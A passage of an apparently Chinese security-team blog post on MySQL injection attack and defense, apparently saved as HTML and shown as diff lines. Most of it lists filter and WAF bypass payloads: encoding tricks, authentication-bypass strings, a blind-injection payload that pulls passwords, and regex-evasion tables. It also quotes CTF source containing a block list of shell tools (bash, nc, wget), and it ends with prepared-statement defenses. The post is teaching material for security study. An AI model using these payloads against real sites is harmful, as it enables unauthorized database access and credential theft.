+<td>2B</td>
+<td>+</td>
+</tr>
+<tr>
+<td>2D</td>
+<td>–</td>
+</tr>
+<tr>
+<td>7E</td>
+<td>~</td>
+</tr>
+<tr>
+<td>21</td>
+<td>!</td>
+</tr>
+<tr>
+<td>40</td>
+<td>@</td>
+</tr>
+</tbody>
+</table>
+<h4>注释符&amp;引号</h4>
+<pre><code class="sql">SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&amp;#39;localhost&amp;#39; and/**/1=1;
+SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&amp;#39;localhost&amp;#39; and&amp;quot;1=1&amp;quot;;
+</code></pre>
+<h3>编码绕过</h3>
+<table>
+<thead>
+<tr>
+<th>column</th>
+<th>column</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>URL Encoding</td>
+<td>SELECT %74able<em>%6eame FROM information</em>schema.tables;</td>
+</tr>
+<tr>
+<td>Double URL Encoding</td>
+<td>SELECT %2574able<em>%256eame FROM information</em>schema.tables;</td>
+</tr>
+<tr>
+<td>Unicode Encoding</td>
+<td>SELECT %u0074able<em>%u6eame FROM information</em>schema.tables;</td>
+</tr>
+</tbody>
+</table>
+<h3>关键字绕过</h3>
+<p>测试用例<code>information_schema.tables</code></p>
+<table>
+<thead>
+<tr>
+<th>column</th>
+<th>column</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>空格</td>
+<td>information<em>schema . tables</em></td>
+</tr>
+<tr>
+<td>反引号</td>
+<td><code>information&lt;/em&gt;schema</code>.<code>tables</code></td>
+</tr>
+<tr>
+<td>特殊符</td>
+<td>/<em>!information<em>schema.tables</em>/</em></td>
+</tr>
+<tr>
+<td>别名</td>
+<td>informationschema.partitions,statistics,key<em>column</em>usage,table_constraints</td>
+</tr>
+</tbody>
+</table>
+<h3>认证绕过</h3>
+<p>绕过语句：'='</p>
+<pre><code class="sql">select data from users where name="="
+select data from users where flase="
+select data from users where 0=0
+</code></pre>
+<p>绕过语句：'-'</p>
+<pre><code class="sql">select data from users where name=''-''
+select data from users where name=0-0
+select data from users where 0=0
+</code></pre>
+<p>比如登录的时候需要输入email和passwd，可以这样输入</p>
+<pre><code class="http">email=''&amp;password=''
+</code></pre>
+<h3>类型转换</h3>
+<pre><code class="sql">' or 1=true
+' or 1
+select * from users where 'a'='b'='c'
+select * from users where ('a'='b')='c'
+select * from users where (false)='c'
+select * from users where (0)='c'
+select * from users where (0)=0
+select * from users where true
+select * from users
+</code></pre>
+<p>我们还有关于此的漏洞，就以一次CTF的题目来说(源码如下)：</p>
+<pre><code class="php">&amp;lt;?php
+class fiter{
+    var $str;
+    var $order;
+
+function sql_clean($str){
+    if(is_array($str)){
+        echo &amp;quot;&amp;lt;script&amp;gt; alert(&amp;#39;not array!!@_@&amp;#39;);parent.location.href=&amp;#39;index.php&amp;#39;; &amp;lt;/script&amp;gt;&amp;quot;;exit;
+    }
+    $filter = &amp;quot;/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&amp;amp;|&amp;quot;.urldecode(&amp;#39;%09&amp;#39;).&amp;quot;|&amp;quot;.urldecode(&amp;quot;%0a&amp;quot;).&amp;quot;|&amp;quot;.urldecode(&amp;quot;%0b&amp;quot;).&amp;quot;|&amp;quot;.urldecode(&amp;#39;%0c&amp;#39;).&amp;quot;|&amp;quot;.urldecode(&amp;#39;%0d&amp;#39;).&amp;quot;/i&amp;quot;;
+    if(preg_match($filter,$str)){
+        echo &amp;quot;&amp;lt;script&amp;gt; alert(&amp;#39;illegal character!!@_@&amp;#39;);parent.location.href=&amp;#39;index.php&amp;#39;; &amp;lt;/script&amp;gt;&amp;quot;;exit;
+    }else if(strrpos($str,urldecode(&amp;quot;%00&amp;quot;))){
+        echo &amp;quot;&amp;lt;script&amp;gt; alert(&amp;#39;illegal character!!@_@&amp;#39;);parent.location.href=&amp;#39;index.php&amp;#39;; &amp;lt;/script&amp;gt;&amp;quot;;exit;
+    }
+    return $this-&amp;gt;str=$str;
+}
+
+function ord_clean($ord){
+    $filter = &amp;quot; |bash|perl|nc|java|php|&amp;gt;|&amp;gt;&amp;gt;|wget|ftp|python|sh&amp;quot;;
+    if (preg_match(&amp;quot;/&amp;quot;.$filter.&amp;quot;/i&amp;quot;,$ord) == 1){
+        return $this-&amp;gt;order = &amp;quot;&amp;quot;;
+    }
+    return $this-&amp;gt;order = $ord;
+}
+
+}
+</code></pre>
+<p>这里过滤了很多关键词了，需要用到类型转换了，这里我们用+号</p>
+<pre><code class="bash">Payload如下：
+uname=aa&amp;#39;+(ascii(mid((passwd)from(1)))&amp;gt;0)+&amp;#39;1
+执行的SQL语句如下：
+xxxxxx where username = &amp;#39;aa&amp;#39;+(ascii(mid((passwd)from(users)))&amp;gt;0)+&amp;#39;1&amp;#39;
+这样就可以开始写脚本跑数据了
+</code></pre>
+<p>除了＋号，其他算术操作符号也会发生类型的类型转换，例如MOD，DIV，＊，／，％，－，<br>
+关于隐式类型转换的文章可以看<a href="http://www.freebuf.com/articles/web/8773.html">这里</a></p>
+<h3>HTTP参数污染</h3>
+<p>当我们传入的参数为</p>
+<pre><code class="http">http://sqlinjection.com/?par1=val1&amp;amp;par1=val2
+</code></pre>
+<p>进入到不同的Web Server就可能得到不同的结果，这里借鉴一下国外大佬一篇文章的总结，如下：</p>
+<table>
+<thead>
+<tr>
+<th>Web Server</th>
+<th>Parameter Interpretation</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ASP.NET/IIS</td>
+<td>Concatenation by comma</td>
+<td>par1=val1,val2</td>
+</tr>
+<tr>
+<td>ASP/IIS</td>
+<td>Concatenation by comma</td>
+<td>par1=val1,val2</td>
+</tr>
+<tr>
+<td>PHP/Apache</td>
+<td>The last param is resulting</td>
+<td>par1=val2</td>
+</tr>
+<tr>
+<td>JSP/Tomcat</td>
+<td>The first param is resulting</td>
+<td>par1=val1</td>
+</tr>
+<tr>
+<td>Perl/Apache</td>
+<td>The first param is resulting</td>
+<td>par1=val1</td>
+</tr>
+<tr>
+<td>DBMan</td>
+<td>Concatenation by two tildes</td>
+<td>par1=val1~~val2</td>
+</tr>
+</tbody>
+</table>
+<p>不同的web server的处理结果截然不同</p>
+<table>
+<thead>
+<tr>
+<th>Query String</th>
+<th>Apache/2.2.16, PHP/5.3.3</th>
+<th>IIS6/ASP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>?test[1=2</td>
+<td>test_1=2</td>
+<td>test[1=2</td>
+</tr>
+<tr>
+<td>?test=%</td>
+<td>test=%</td>
+<td>test=</td>
+</tr>
+<tr>
+<td>?test%00=1</td>
+<td>test=1</td>
+<td>test=1</td>
+</tr>
+<tr>
+<td>?test=1%001</td>
+<td>NULL</td>
+<td>test=1</td>
+</tr>
+<tr>
+<td>?test+d=1+2</td>
+<td>test_d=1 2</td>
+<td>test d=1 2</td>
+</tr>
+</tbody>
+</table>
+<p>这里也推荐一篇国外的<a href="http://www.blackhat.com/presentations/bh-usa-09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-SLIDES.pdf">文章</a></p>
+<h2>实战正则过滤绕过</h2>
+<table>
+<thead>
+<tr>
+<th>过滤字符</th>
+<th>PHP正则代码</th>
+<th>原查询语句</th>
+<th>现查询语句</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>and, or</td>
+<td>preg_match(‘/(and|or)/i’, $id)</td>
+<td>1 or 1 = 1,1 and 1 = 1</td>
+<td>1 || 1 = 1,    1 &amp;&amp; 1 = 1</td>
+</tr>
+<tr>
+<td>and, or, union</td>
+<td>preg_match(‘/(and|or|union)/i’, $id)</td>
+<td>union select user, password from users</td>
+<td>1 || (select user from users where user_id = 1) = ‘admin’</td>
+</tr>
+<tr>
+<td>and, or, union, where</td>
+<td>preg_match(‘/(and|or|union|where)/i’, $id)</td>
+<td>1 || (select user from users where user_id = 1) = ‘admin’</td>
+<td>1 || (select user from users limit 1) = ‘admin’</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit</td>
+<td>preg_match(‘/(and|or|union|where|limit)/i’, $id)</td>
+<td>1 || (select user from users limit 1) = ‘admin’</td>
+<td>1 || (select user from users group by user_id having user_id = 1) = ‘admin’</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by</td>
+<td>preg_match(‘/(and|or|union|where|limit|group by)/i’, $id)</td>
+<td>1 || (select user from users group by user_id having user_id = 1) = ‘admin’</td>
+<td>1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select</td>
+<td>preg_match(‘/(and|or|union|where|limit|group by|select)/i’, $id)</td>
+<td>1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</td>
+<td>1 || 1 = 1 into outfile ‘result.txt’ <br>1 || substr(user,1,1) = ‘a’</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select, ‘</td>
+<td>preg_match(‘/(and|or|union|where|limit|group by|select|\’)/i’, $id)</td>
+<td>1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</td>
+<td>1 || user_id is not null<br>1 || substr(user,1,1) = 0x61<br>1 || substr(user,1,1) = unhex(61)</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select, ‘, hex</td>
+<td>preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex)/i’, $id)</td>
+<td>1 || substr(user,1,1) = unhex(61)</td>
+<td>1 || substr(user,1,1) = lower(conv(11,10,36))</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select, ‘, hex, substr</td>
+<td>preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex|substr)/i’, $id)</td>
+<td>1 || substr(user,1,1) = lower(conv(11,10,36))</td>
+<td>1 || lpad(user,7,1)</td>
+</tr>
+<tr>
+<td>and, or, union, where, limit, group by, select, ‘, hex, substr, white space</td>
+<td>preg_match(‘/(and|or|union|where|limit|group by|select|\’|hex|substr|\s)/i’, $id)</td>
+<td>1 || lpad(user,7,1)</td>
+<td>1%0b||%0blpad(user,7,1)</td>
+</tr>
+</tbody>
+</table>
+<h2>防御手段(代码以PHP为例)</h2>
+<p>像WAF之类防御手段自己无能为力经常打补丁就好，这里主要提一下代码层面的问题<br>
+推荐使用下面的方式进行查询：</p>
+<h3>MYSQLi</h3>
+<pre><code class="php">$stmt = $db-&gt;prepare('update name set name = ? where id = ?');
+$stmt-&gt;bind_param('si',$name,$id);
+$stmt-&gt;execute();
+</code></pre>
+<h3>ODBC</h3>
+<pre><code class="php">$stmt = odbc_prepare( $conn, 'SELECT * FROM users WHERE email = ?' );
+$success = odbc_execute( $stmt, array($email) );
+</code></pre>
+<p>或者</p>
+<pre><code class="php">$dbh = odbc_exec($conn, 'SELECT * FROM users WHERE email = ?', array($email));
+$sth = $dbh-&gt;prepare('SELECT * FROM users WHERE email = :email');
+$sth-&gt;execute(array(':email' =&gt; $email));
+</code></pre>
+<h3>PDO</h3>
+<pre><code class="PHP">$dbh = new PDO('mysql:dbname=testdb;host=127.0.0.1', $user, $password);
+$stmt = $dbh-&gt;prepare('INSERT INTO REGISTRY (name, value) VALUES (:name, :value)');
+$stmt-&gt;bindParam(':name', $name);
+$stmt-&gt;bindParam(':value', $value);&lt;/p&gt;
+
+&lt;p&gt;// insert one row
+$name = 'one';
+$value = 1;
+$stmt-&gt;execute();
+</code></pre>
+<p>或者</p>
+<pre><code class="php">$dbh = new PDO('mysql:dbname=testdb;host=127.0.0.1', $user, $password);
+$stmt = $dbh-&gt;prepare('UPDATE people SET name = :new&lt;em&gt;name WHERE id = :id');
+$stmt-&gt;execute( array('new&lt;/em&gt;name' =&gt; $name, 'id' =&gt; $id) );
+</code></pre>
+<h3>框架</h3>
+<p>对于框架的话只要遵循框架的API就好，例如wp的查询</p>
+<pre><code class="php">global $wpdb;
+$wpdb-&gt;query(
+    $wpdb-&gt;prepare( 'SELECT name FROM people WHERE id = %d OR email = %s',
+        $person_id, $person_email
+    )
+);
+或者
+global $wpdb;
+$wpdb-&gt;insert( 'people',
+        array(
+            'person_id' =&gt; '123',
+            'person_email' =&gt; 'bobby@tables.com'
+        ),
+    array( '%d', '%s' )
+);
+</code></pre>
+<h2>参考</h2>
+<p>这篇文章主要是做一个总结，有的点可能描述的不是很细致，可以自己再深入研究</p>
+<ul>
+<li>[https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph<em>mccray-adv</em>sql<em>injection.pdf](https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph</em>mccray-adv<em>sql</em>injection.pdf)</li>
+<li><a href="https://www.ptsecurity.com/upload/corporate/ww-en/download/PT-devteev-CC-WAF-ENG.pdf">https://www.ptsecurity.com/upload/corporate/ww-en/download/PT-devteev-CC-WAF-ENG.pdf</a></li>
+<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf">https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH<em>US</em>12<em>Ristic</em>Protocol<em>Level</em>Slides.pdf</a></li>
+<li><a href="https://www.exploit-db.com/papers/17934/">https://www.exploit-db.com/papers/17934/</a></li>
+<li><a href="http://wooyun.jozxing.cc/static/drops/tips-7299.html">http://wooyun.jozxing.cc/static/drops/tips-7299.html</a></li>
+<li><a href="http://www.cnblogs.com/helingfeng/p/6486854.html">http://www.cnblogs.com/helingfeng/p/6486854.html</a></li>
+<li><a href="http://voice0fblackhat.blogspot.com/2012/01/tut-waf-bypassing-tut-sharing.html">http://voice0fblackhat.blogspot.com/2012/01/tut-waf-bypassing-tut-sharing.html</a></li>
+</ul>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			This entry was posted in <a href="http://blog.sycsec.com/?cat=3" rel="category">渗透测试</a> on <a href="http://blog.sycsec.com/?p=1005" title="下午 6:17" rel="bookmark"><time class="entry-date" datetime="2017-04-21T18:17:54+00:00">2017 年 4 月 21 日</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="http://blog.sycsec.com/?author=1" title="View all posts by syclover" rel="author">syclover</a></span></span>.								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+
+				<nav class="nav-single">
+					<h3 class="assistive-text">Post navigation</h3>
+					<span class="nav-previous"><a href="http://blog.sycsec.com/?p=978" rel="prev"><span class="meta-nav">←</span> NJCTF2017-writeup</a></span>
+					<span class="nav-next"><a href="http://blog.sycsec.com/?p=1095" rel="next">胖哈勃杯第十三届CUIT校赛官方Writeup <span class="meta-nav">→</span></a></span>
+				</nav><!-- .nav-single -->
+
+				
+<div id="comments" class="comments-area">
+
+	
+	
+	
+</div><!-- #comments .comments-area -->
+			
+		</div><!-- #content -->
+	</div><!-- #primary -->
+
+
+			<div id="secondary" class="widget-area" role="complementary">
+			<aside id="search-2" class="widget widget_search"><form role="search" method="get" id="searchform" class="searchform" action="http://blog.sycsec.com/">
+				<div>
+					<label class="screen-reader-text" for="s">搜索：</label>
+					<input name="s" id="s" type="text">
+					<input id="searchsubmit" value="搜索" type="submit">
+				</div>
+			</form></aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widget-title">近期文章</h3>		<ul>
+					<li>
+				<a href="http://blog.sycsec.com/?p=1095">胖哈勃杯第十三届CUIT校赛官方Writeup</a>
+						</li>
+					<li>
+				<a href="http://blog.sycsec.com/?p=1005">MySQL注入攻击与防御</a>
+						</li>
+					<li>
+				<a href="http://blog.sycsec.com/?p=978">NJCTF2017-writeup</a>
+						</li>
+					<li>
+				<a href="http://blog.sycsec.com/?p=894">第七季极客大挑战writeup</a>
+						</li>
+					<li>
+				<a href="http://blog.sycsec.com/?p=881">SCTF2016-writeup</a>
+						</li>
+				</ul>
+		</aside>		<aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">近期评论</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">chxx</span>发表在《<a href="http://blog.sycsec.com/?p=350#comment-47">windows常见反调试</a>》</li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.onlyend.com/" rel="external nofollow" class="url">结局汪汪汪</a></span>发表在《<a href="http://blog.sycsec.com/?p=183#comment-46">Android动态调试</a>》</li><li class="recentcomments"><span class="comment-author-link"><a href="http://joychou.org/" rel="external nofollow" class="url">JoyChou</a></span>发表在《<a href="http://blog.sycsec.com/?p=350#comment-45">windows常见反调试</a>》</li><li class="recentcomments"><span class="comment-author-link">同样喜欢安全,求联系</span>发表在《<a href="http://blog.sycsec.com/?p=183#comment-30">Android动态调试</a>》</li><li class="recentcomments"><span class="comment-author-link"><a href="http://honebl.sinaapp.com/" rel="external nofollow" class="url">h_one</a></span>发表在《<a href="http://blog.sycsec.com/?p=176#comment-29">Android入门篇</a>》</li></ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">文章归档</h3>		<ul>
+			<li><a href="http://blog.sycsec.com/?m=201706">2017年六月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201704">2017年四月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201703">2017年三月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201611">2016年十一月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201605">2016年五月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201511">2015年十一月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201506">2015年六月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201505">2015年五月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201504">2015年四月</a></li>
+	<li><a href="http://blog.sycsec.com/?m=201412">2014年十二月</a></li>
+		</ul>
+		</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">分类目录</h3>		<ul>
+	<li class="cat-item cat-item-10"><a href="http://blog.sycsec.com/?cat=10">CTF</a>
+</li>
+	<li class="cat-item cat-item-7"><a href="http://blog.sycsec.com/?cat=7">WarGame</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://blog.sycsec.com/?cat=1">未分类</a>
+</li>
+	<li class="cat-item cat-item-3"><a href="http://blog.sycsec.com/?cat=3">渗透测试</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://blog.sycsec.com/?cat=4">逆向工程</a>
+</li>
+		</ul>
+</aside><aside id="meta-2" class="widget widget_meta"><h3 class="widget-title">功能</h3>			<ul>
+						<li><a href="http://blog.sycsec.com/wp-login.php">登录</a></li>
+			<li><a href="http://blog.sycsec.com/?feed=rss2">文章<abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://blog.sycsec.com/?feed=comments-rss2">评论<abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="https://cn.wordpress.org/" title="基于WordPress，一个优美、先进的个人信息发布平台。">WordPress.org</a></li>			</ul>
+			</aside>		</div><!-- #secondary -->
+		</div><!-- #main .wrapper -->
+	<footer id="colophon" role="contentinfo">
+		<div class="site-info">
+						<a href="https://wordpress.org/" title="Semantic Personal Publishing Platform">Proudly powered by WordPress</a>
+		</div><!-- .site-info -->
+	</footer><!-- #colophon -->
+</div><!-- #page -->
+
+<script type="text/javascript" src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/navigation.js"></script>
+<script type="text/javascript" src="MySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20|%20Syclover%20Team_files/wp-embed.js"></script>
+
+</body></html>
